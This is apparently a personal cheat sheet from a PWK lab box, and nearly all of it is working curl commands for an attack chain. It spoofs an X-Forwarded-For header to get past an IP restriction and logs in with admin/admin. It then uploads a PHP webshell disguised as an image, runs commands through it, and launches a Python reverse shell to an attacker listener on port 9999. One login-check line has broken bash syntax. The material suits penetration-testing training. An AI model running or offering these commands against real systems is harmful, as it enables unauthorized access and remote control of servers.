
# Exmples with X-Forwarded-For:

This is based on a pwk lab box for a php webshell.

## Get page

```bash
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80"
```

## Login

```bash
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80" -d "username=admin&password=admin" | grep "welcome back" 

curl http://192.168.81.138/administration/ -v -H "X-Forwarded-For: 127.0.0.1:80" -d "username=admin&password=admin" -s | grep -q  "welcome back"; then echo "Logged In"; else echo "Login Failed"; fi
```

## Get the login cookie from the last response 

```bash
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80" -v -d "username=admin&password=admin" -c cookie
```

## Get upload page

```bash
curl http://192.168.81.138/administration/upload/ -H "X-Forwarded-For: 127.0.0.1:80" -v -b cookie 
```

## Post a file. (set mimetype on image from php)

```bash
curl http://192.168.81.138/administration/upload/ -H "X-Forwarded-For: 127.0.0.1:80" -b cookie -F 'document=@shell.php;type=image/jpg'  --proxy 127.0.0.1:8080
```

## Call shell

```
curl http://192.168.81.138/administration/upload/files/1633532386shell.php?cmd=id -H "X-Forwarded-For: 127.0.0.1:80" -b cookie 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## RevShell

Start nc 

```
nc -lnpv 9999
```

```
curl http://192.168.81.138/administration/upload/files/1633532386shell.php?cmd="python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.81%22,9999));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22bash%22)'" -H "X-Forwarded-For: 127.0.0.1:80" -b cookie
```
